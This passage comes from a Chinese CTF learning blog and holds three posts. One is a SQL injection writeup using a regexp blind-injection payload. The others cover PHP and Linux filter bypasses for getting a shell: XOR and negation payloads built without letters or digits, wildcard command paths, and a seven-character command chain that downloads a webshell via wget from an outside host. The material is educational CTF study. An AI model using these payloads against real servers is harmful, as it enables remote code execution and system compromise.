</span><br><span class="line"></span><br><span class="line">$result = mysql_query($query);</span><br><span class="line">$result = mysql_fetch_array($result);</span><br><span class="line">$admin_pass = mysql_fetch_array(mysql_query(&quot;select pw from chal where user=&apos;admin&apos;&quot;));</span><br><span class="line">echo &quot;&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;&quot;;</span><br><span class="line">if($result[&apos;user&apos;]) echo &quot;&lt;h2&gt;Welcome &#123;$result[&apos;user&apos;]&#125;&lt;/h2&gt;&quot;; </span><br><span class="line">if(($admin_pass[&apos;pw&apos;])&amp;&amp;($admin_pass[&apos;pw&apos;] === $_GET[&apos;pw&apos;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>其实主要的重点就是这过滤的语句:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$black_list = &quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&apos;|&quot;;</span><br><span class="line">$black_list .= &quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;;</span><br></pre></td></tr></table></figure></p>
<p>审查源码不难发现，我们需要通过注入得出密码才能得到flag，并不能通过注入直接得到flag。但是有几个问题需要解决:<br>第一个问题是’被过滤，如何造成单引号溢出是一个问题，第二个问题是如何注释掉后面的无关语句，但是三种过滤符号都被过滤了。第三个问题就是某些重要的关键词被过滤了，如何绕过通过查询语句来得到我们所要的密码。<br>第一个问题，我们可以发现black_list中并没有过滤\这个转义符，这里可以造成’逃逸。<br>第二个问题，在mysql中，查询语句一般需要用;作为结束的符号，也就是说我们把;嵌入查询语句，那;之后的语句都不会执行。所以可以使用;来作为替代注释符号。<br>第三个问题，or被过滤可以使用||来替代，然后&gt;，&lt;，=比较符被过滤，我们可以考虑like，但是like也被过滤了，再仔细看看黑名单，发现了regexp并没被过滤，也就是说我们可以用正则匹配来爆破出密码。发现查询成功就会返回welcome的字样，所以构造如下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=\&amp;pw=||pw/**/regexp/**/&quot;^1&quot;;</span><br></pre></td></tr></table></figure></p>
<p>通过改变查询值爆破即可得到flag。</p>
<p>参考链接：<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof/" target="_blank" rel="noopener">整数溢出原理介绍</a><br><a href="https://blog.csdn.net/Mary19920410/article/details/71518130?locationNum=4&amp;fps=1" target="_blank" rel="noopener">浅析C语言之uint8_t / uint16_t / uint32_t /uint64_t</a><br><a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/" target="_blank" rel="noopener">2018护网杯-web-writeup</a><br><a href="https://blog.csdn.net/qq_32400847/article/details/58756980" target="_blank" rel="noopener"><br>基于SQLite数据库的Web应用程序注入指南</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/10/15/近期比赛学习总结/" data-id="cjv4r4s06002rmcvjlrso09zw" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-关于命令执行的学习" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/10/08/关于命令执行的学习/" class="article-date">
  <time class="post-time" datetime="2018-10-08T11:33:09.000Z" itemprop="datePublished">
    <span class="post-month">10月</span><br>
    <span class="post-day">08</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/08/关于命令执行的学习/">关于命令执行的初步学习</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在此之前写了一篇关于getshell的文章，主要是关于一些如何绕过限制的技巧的，这一篇可以理解为上一篇的后续，主要补充一些linux下命令执行的绕过技巧，以及如何通过仅限的长度来构造shell进行执行。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>现在很多题目都丢在docker中，一般docker环境都是linux，所以学好linux下的命令至关重要。接下来梳理一些常用命令:<br>wget:在后面接上下载文件的地址，可以将文件下载下来。-C参数可以将文件保存为你所要的文件名。这个命令一般用来下载shell，在无法写入shell的时候可以尝试。<br>>:定向输出到文件，如果文件不存在，就创建文件；如果文件存在，就将其清空。这个一般用法是通过  echo “内容” &gt;文件名  的格式来将内容写入文件里面，一般是用来写入shell。<br>;:命令分隔符<br>…….<br>其他的命令自行查阅<a href="http://www.cnblogs.com/yjd_hycf_space/p/7730690.html" target="_blank" rel="noopener">Linux常用命令大全</a></p>
<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>一般来说，我们通过网页输入的命令会经过php代码的过滤以及转义处理才进而在服务器中执行，很多过滤操作也是由php代码来完成，所以很多绕过方式也是基于php环境的(例如上一篇的过滤绕过方式)。</p>
<h3 id="命令符"><a href="#命令符" class="headerlink" title="命令符"></a>命令符</h3><p>这么说也不太贴切，主要是指`符号被过滤的情况下，具体作用在上一篇应该讲过。如果我们输入的命令被解析为字符串，那么使用这个符号就能让我们的命令被系统认为是命令来执行，所以在过滤了`这个情况下，我们如何使用其他的符号来使得我们的字符串被解析为命令呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$( 命令 )</span><br></pre></td></tr></table></figure></p>
<p>这个就可以成功让其解析。</p>
<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>过滤的时候可能会通过过滤空格来阻止命令执行:<br><img src="/images/18/1.png" alt=""><br>通过测试可以看见当在过滤了空格之后cat命令是无法执行的，但是无伤大雅，图中可以看到我们可以通过几种方式来绕过:<br>&lt;<br>$IFS$9<br>${IFS}<br>$IFS在测试时发现，无法输出任何东西，主要原因是因为$IFS类似一个截断字符，具体原理也不详谈，总而言之就是将{}加入之后就能稳定的让命令执行。<br>还有一个在php环境下可以替代空格的字符%09，可以在php环境下进行测试。</p>
<h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><p>命令分隔符简而言之就是链接两个命令的符号，在linux中最为常见的就是；，但是依旧有替代的符号可以在过滤了;的情况下进行命令分隔:<br><img src="/images/18/2.png" alt=""><br>可以看到最为基本的就是;进行分割，测试中发现|和&amp;只能起到执行后者命令的作用，看大手子的文章是说执行了但不回显，具体原理不去深究，在php环境下如下字符也是可以起到命令分隔的作用的:<br><img src="/images/18/3.png" alt=""></p>
<h3 id="命令终止符"><a href="#命令终止符" class="headerlink" title="命令终止符"></a>命令终止符</h3><p>顾名思义就是终止命令的符号，有%00，%20也就是#的编码。</p>
<h3 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h3><p>这一部分在上一篇文章详细写过了，这里主要再提一些Linux下的绕过操作:<br><img src="/images/18/4.png" alt=""><br>如上图所示，我列出了三种方法，第一种是通过构造几个变量，然后拼接而成；第二种和第一种类似，通过字符串的拼接来绕过关键词过滤；第三种则是编码绕过，最为常见的就是base64，在有其他环境的情况下还可以使用其他的编码，不过值得注意的是需要学会如何在linux下进行解码。</p>
<h2 id="七个字的命令执行"><a href="#七个字的命令执行" class="headerlink" title="七个字的命令执行"></a>七个字的命令执行</h2><p>这也是我参考了很多大牛写的有关命令执行的文章中所提到一个最开始研究这方向的原因，题目短小精简，代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(strlen($_GET[1])&lt;8)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>我一开始思路就是要么下一个shell，要么写入一个shell，但是发现这貌似有点行不通，例如当我们需要下载一个shell时，<strong>wget xxxx</strong>这里是肯定要超过8个字数限制的，然后写入shell这个思路怕是更加不行，我们写入的话必须用echo “xxx”&gt;1，除去xxx单单必要的函数加符号就有8个，所以两种方式都不行。<br>根据大手子的文章，发现了一个&gt;写入符号的特性，我们可以使用&gt;1来建立一个名为1的文件，但是没有echo的存在是无法写入任何内容的。继续跟着思路走，既然我们可以建立很多文件，那我们有没有可能把文件名一个一个总的写入一个新的文件呢？大手子提到的第二个操作就是<strong>ls&gt;a</strong>，ls列出所有的文件名然后写入a的新文件中：<br><img src="/images/18/5.png" alt=""><br>但是如图所示写入之后发现有几个问题：第一就是写入的内容是通过ASCII码来进行排序的，也就是说我们这样写必须得时刻注意文件名开头的ASCII码排序，如果在写入shell时要注意这个问题的话太过烦琐了，这个时候就可以用时间排序来进行排列，ls -t排序是把最先创建的文件排在最后：<br><img src="/images/18/6.png" alt=""><br>也就是说我们可以通过ls -t解决排序问题，接着就是没有办法写入&lt;?&gt;这几个符号，也就是说我们没办法写入shell，那只剩一条路了，就是通过写入wget a.cn来下载一个shell了：<br><img src="/images/18/7.png" alt=""><br>但是这时候出现了一个问题，就是我们输入的内容没办法有效的当成命令来执行，这里就需要用到\这个转义符来拼接命令了，在例如ec   ho时，我们可以通过转义换行符来拼接成echo这个命令，如下所示:<br><img src="/images/18/8.png" alt=""><br>可以看到我们通过用\转义符替代了;以及成功转义了换行符成功拼接了命令，echo成功输出了1，所以思路出来了，我们构造如下命令就可以写入shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;1.php</span><br><span class="line">&gt;-O\ \\</span><br><span class="line">&gt;cn\ \\</span><br><span class="line">&gt;\ a.\\</span><br><span class="line">&gt;wget\\</span><br></pre></td></tr></table></figure></p>
<p>参考文章：<br><a href="https://blog.csdn.net/qq_27446553/article/details/73927518" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a><br><a href="http://wonderkun.cc/index.html/?p=524" target="_blank" rel="noopener">从七个字符长度的任意命令执行到GetShell</a><br><a href="https://www.lorexxar.cn/2017/11/10/hitcon2017-writeup/" target="_blank" rel="noopener"><br>HITCON2017-writeup整理</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/10/08/关于命令执行的学习/" data-id="cjv4r4ryx001pmcvjnqyjkyqo" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-绕过过滤getshell的一些骚操作" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/27/绕过过滤getshell的一些骚操作/" class="article-date">
  <time class="post-time" datetime="2018-09-27T07:58:05.000Z" itemprop="datePublished">
    <span class="post-month">9月</span><br>
    <span class="post-day">27</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/27/绕过过滤getshell的一些骚操作/">绕过过滤getshell的一些骚操作</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近忙着一些社团的杂事，学习进度一度停滞不前….不知怎么见着其他人的技术越来越高，心中有了一丝无奈以及失望，不知道还能坚持多久下去，咸鱼总是停于安逸之处，强者总能一直前进不止。<br>借着安恒的题目归纳一下绕过限制getshell的几种策略。</p>
<h2 id="getshell前置内容"><a href="#getshell前置内容" class="headerlink" title="getshell前置内容"></a>getshell前置内容</h2><p>在之前的文章讲过了getshell的一些基本内容，重复内容就不讲解了。一般我们通过一些函数来传入命令参数，再通过解析将命令执行最终输出我们想要的结果，具体说一下这些函数的特点:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert():检查一个断言是否为 FALSE，如果是 FALSE 则返回 FALSE，否则是 TRUE。但是这并不是它被利用的原因，在传入一个字符串后，这个字符串会被当做PHP代码来执行，比如我们常用的phpinfo()，file_put_content()等等都能执行。值得注意的是这里不仅仅可以传入字符串，也能传入函数。</span><br><span class="line">eval():把字符串按照 PHP 代码来计算，和上者类似，但是eval()只能传入字符串。</span><br><span class="line">system():执行外部程序，并且显示输出。执行命令把结果返回。  </span><br><span class="line">exec():执行命令，如果带有参数，会将结果返回。</span><br></pre></td></tr></table></figure></p>
<p>然后就是要认识一些基础的linux或者windows下的命令了，具体可以自行百度，后续用到的命令也会粗略提及。  </p>
<h2 id="函数被过滤"><a href="#函数被过滤" class="headerlink" title="函数被过滤"></a>函数被过滤</h2><p>一般来说，网站会通过过滤shell里常用的一些函数来防止被攻击，常见的过滤手段如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$iarok[] = str_ireplace(array(&apos;unlink&apos;,&apos;opendir&apos;,&apos;mysqli_&apos;,&apos;mysql_&apos;,&apos;socket_&apos;,&apos;curl_&apos;,&apos;base64_&apos;,&apos;putenv&apos;,&apos;popen(&apos;,&apos;phpinfo&apos;,&apos;pfsockopen&apos;,&apos;proc_&apos;,&apos;preg_&apos;,&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;,&apos;_REQUEST&apos;,&apos;_SESSION&apos;,&apos;_SERVER&apos;,&apos;assert&apos;,&apos;eval(&apos;,&apos;file_&apos;,&apos;passthru(&apos;,&apos;exec(&apos;,&apos;system(&apos;,&apos;shell_&apos;), &apos;@.@&apos;, $v);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>通过将命令执行函数或者一些危险的存在利用点的函数全部用无效符号替换。这种过滤的绕过方式有大致几种，第一种就是通过字符串拼接来绕过，其余可以通过大小写绕过，或者双写绕过，这里的方式可以参考之前XSS过滤的方式。  </p>
<h3 id="参考示例"><a href="#参考示例" class="headerlink" title="参考示例"></a>参考示例</h3><p>最近接触到的应该是安恒杯9月web1，web1通过利用之前seacms爆出的漏洞而改的，具体示例可以参考seacms最新后台getshell的文章:<a href="https://www.anquanke.com/post/id/153402。" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153402。</a><br>在过滤了_GET，_POST以及cookie传参的途径下，通过字符拼接成功构造了payload。参考如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[&quot;_G&quot;.&quot;ET&quot;][$a]($GLOBALS[&quot;_G&quot;.&quot;ET&quot;][$b]);</span><br></pre></td></tr></table></figure></p>
<p>我们传入a=system&amp;b=ls，就形成了system(“ls”);，ls命令成功执行最后返回结果。  </p>
<h2 id="数字和字母被过滤"><a href="#数字和字母被过滤" class="headerlink" title="数字和字母被过滤"></a>数字和字母被过滤</h2><p>这个比上面那个过滤稍微狠一点，拼接字符串是不太可能实现了，具体过滤实现代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) &#123;</span><br><span class="line">  eval($_GET[&apos;shell&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>虽然过滤了数字和字符，但是这并不意味着就没办法构造出字符和数字了，异或以及反取符号都在的情况下，可以通过不可见字符转换为字母，比如以下的几个例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&apos;a&apos; = &apos;=&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;e&apos; = &apos;@&apos; ^ &apos;%&apos;</span><br><span class="line">&apos;r&apos; = &apos;.&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;t&apos; = &apos;(&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;s&apos; = &apos;/&apos; ^ &apos;\\&apos;</span><br><span class="line">&apos;m&apos; = &apos;-&apos; ^ &apos;@&apos;</span><br><span class="line">&apos;y&apos; = &apos;&amp;&apos; ^ &apos;_&apos;</span><br><span class="line">&apos;E&apos; = &apos;&gt;&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;G&apos; = &apos;&lt;&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;O&apos; = &apos;/&apos; ^ &apos;`&apos;</span><br><span class="line">&apos;P&apos; = &apos;+&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;S&apos; = &apos;(&apos; ^ &apos;&#123;&apos;</span><br><span class="line">&apos;T&apos; = &apos;/&apos; ^ &apos;&#123;&apos;</span><br></pre></td></tr></table></figure></p>
<p>这些是我测试出来可以构造payload的操作，可以直接拿来用。例如构造以下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;_&quot;.(&apos;&lt;&apos; ^ &apos;&#123;&apos;).(&apos;&gt;&apos; ^ &apos;&#123;&apos;).(&apos;/&apos; ^ &apos;&#123;&apos;);  //$_=&quot;_GET&quot;</span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);  //$_GET[_]($_GET[__])</span><br><span class="line">&amp;_=(&apos;/&apos; ^ &apos;\\&apos;).(&apos;&amp;&apos; ^ &apos;_&apos;).(&apos;/&apos; ^ &apos;\\&apos;).(&apos;(&apos; ^ &apos;\\&apos;).(&apos;@&apos; ^ &apos;%&apos;).(&apos;-&apos; ^ &apos;@&apos;)  //system($_GET[__])</span><br></pre></td></tr></table></figure></p>
<p>接着传入命令就行了。<br><strong>值得注意的是，不仅仅可以用其他可见字符，不可见字符经过url编码进行异或也是可以实现的。</strong></p>
<h3 id="取反-参考了p神的文章"><a href="#取反-参考了p神的文章" class="headerlink" title="取反(参考了p神的文章)"></a>取反(参考了p神的文章)</h3><p>和上一种方法类似的是取反，例如\x9e取反之后就成了a，各个字符如何通过取反得到可以去测试一下，如下是构造的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;~&quot;\xA0\xB8\xBA\xAB&quot;&#125;[_]($&#123;~&quot;\xA0\xB8\xBA\xAB&quot;&#125;[__]); //$_GET[_]($_GET[__])</span><br><span class="line">&amp;_=&#123;~&quot;\x8c\x86\x8c\x8b\x9a\x92&#125;  //system</span><br><span class="line">&amp;__=&#123;~&quot;\x93\x8c&quot;&#125; //ls</span><br></pre></td></tr></table></figure></p>
<p>此外可以参考p神写的这个payload,他利用了utf8汉字编码提取出类似的编码进行取反:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;&apos;;</span><br><span class="line">$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure></p>
<p><strong>还有一种也是p神想出来的方法，具体操作可以参考他的这篇文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></strong></p>
<h3 id="参考示例-1"><a href="#参考示例-1" class="headerlink" title="参考示例"></a>参考示例</h3><p>这是一道代码审计的题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint = &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>让我们不使用字母以及数字来执行getFlag()这个函数，这里就可以参考上面的payload来进行绕过了，payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot; ^ &quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=getFlag</span><br></pre></td></tr></table></figure></p>
<p><strong>PS:`代表执行命令，?匹配字符，所以形成_GET字符</strong></p>
<h2 id="数字，字母，-以及-被过滤"><a href="#数字，字母，-以及-被过滤" class="headerlink" title="数字，字母，$以及_被过滤"></a>数字，字母，$以及_被过滤</h2><p>这个就比上一个再更加狠一点了，因为我们所要的$被过滤了，也就是说我们无法构造变量了，这里用到了一个很冷门的知识:<strong>?&gt;&lt;?=是可以直接输出后面的代码的</strong>(具体原理参考大师傅们的解释)，以及?是通配符这个知识。例如我们使用/???/???可以匹配/bin/cat这个命令。</p>
<h3 id="参考示例-2"><a href="#参考示例-2" class="headerlink" title="参考示例"></a>参考示例</h3><p>这是安恒杯web2的一部分题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>再通过操作得出有/flag的前提下，我们可以使用上面的知识，生成以下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=?&gt;&lt;?=`/???/??? /????`;?&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="字符长度限制"><a href="#字符长度限制" class="headerlink" title="字符长度限制"></a>字符长度限制</h2><p>这就要结合某次丧心病狂的比赛了，里面都是命令执行，这部分在后续会详细写出来……..</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/09/27/绕过过滤getshell的一些骚操作/" data-id="cjv4r4ryz001smcvj7h772xmf" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Getshell/">Getshell</a></li></ul>

    </footer>
  </div>
  
</article>




  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">next &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Iuhrey的幻想乡</h1>
    <h2 class="blog-subtitle">记录日常所学</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>32</strong><br>文章</div></a>
      <a href="/categories"><div><strong>3</strong><br>分类</div></a>
      <a href="/tags"><div><strong>14</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
          喜欢啥几把BB的狗骑驴
        </a>
      
        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
          喜欢gay在狗骑驴旁边的狗逼
        </a>
      
        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
          gay里gay气的大黄
        </a>
      
        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
          郁离歌大手子的博客
        </a>
      
        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
          有很多小姐姐的烧包包
        </a>
      
    </div>
  </div>
</div>

  
  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=541131&auto=1&height=66"></iframe>
</aside>

        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2018 - 2019 Iuhrey<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
      
    </div>
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
  </div>
</footer>
    </div>
    

